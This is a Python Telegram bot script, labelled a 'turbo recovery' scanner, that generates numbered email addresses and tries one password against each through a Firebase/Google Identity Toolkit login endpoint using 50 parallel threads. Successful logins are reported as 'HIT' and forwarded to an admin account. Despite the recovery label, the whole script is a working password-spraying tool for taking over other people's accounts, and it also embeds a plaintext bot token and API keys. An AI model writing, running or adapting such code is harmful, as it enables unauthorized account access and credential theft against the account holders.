import telebot
import requests
from telebot import types
from threading import Thread
from flask import Flask
import os
from concurrent.futures import ThreadPoolExecutor

# --- RENDER WEB SERVER ---
app = Flask('')

@app.route('/')
def home(): 
    return "⚡ FLAME TURBO SCANNER ONLINE"

def run_flask():
    # Render port binding fix
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
# Ninte puthiya valid token
TOKEN = "8574711169:AAGk87biel9UdUGxFTq9cDW4yOIiz6egRew"
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = 7212602902
API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_states = {}
session = requests.Session()

# --- LOGIN LOGIC ---
def login_acc(email, password):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS['CPM2']}"
        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=5)
        return email if r.status_code == 200 else None
    except: 
        return None

# --- BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Turbo Recovery")
    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER ACTIVE**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🚀 Turbo Recovery")
def ask_format(message):
    msg = bot.send_message(message.chat.id, "📧 **Format ayakkuka:**\n(Ex: `cpmegy_{}_@gmail.com`)")
    bot.register_next_step_handler(msg, get_range)

def get_range(message):
    user_states[message.chat.id] = {'format': message.text.strip()}
    msg = bot.send_message(message.chat.id, "🔢 **Range ayakkuka:**\n(Ex: `1000:2000`)")
    bot.register_next_step_handler(msg, get_pass)

def get_pass(message):
    try:
        s, e = map(int, message.text.split(':'))
        user_states[message.chat.id]['s'] = s
        user_states[message.chat.id]['e'] = e
        msg = bot.send_message(message.chat.id, "🔑 **Password ayakkuka:**")
        bot.register_next_step_handler(msg, start_scan)
    except:
        bot.send_message(message.chat.id, "❌ Format error! (Ex: 1000:5000)")

def start_scan(message):
    cid = message.chat.id
    pwd = message.text.strip()
    data = user_states.get(cid)
    bot.send_message(cid, f"⚡ **Scanning {data['s']} to {data['e']}...**")

    def run():
        emails = [data['format'].replace("{}", str(i)) for i in range(data['s'], data['e'] + 1)]
        
        # Speed 2x aakkan workers 50 aakki
        with ThreadPoolExecutor(max_workers=50) as executor:
            hits = list(filter(None, executor.map(lambda e: login_acc(e, pwd), emails)))
        
        for h in hits:
            bot.send_message(cid, f"✅ **HIT:** `{h}`")
            bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{h}` Found!")
        
        bot.send_message(cid, f"🏁 **Done! Total Hits: {len(hits)}**")

    Thread(target=run).start()

# --- RUNNER ---
if __name__ == "__main__":
    # Flask Background Thread
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    # Bot Start
    print("Bot is starting...")
    bot.infinity_polling(skip_pending=True)
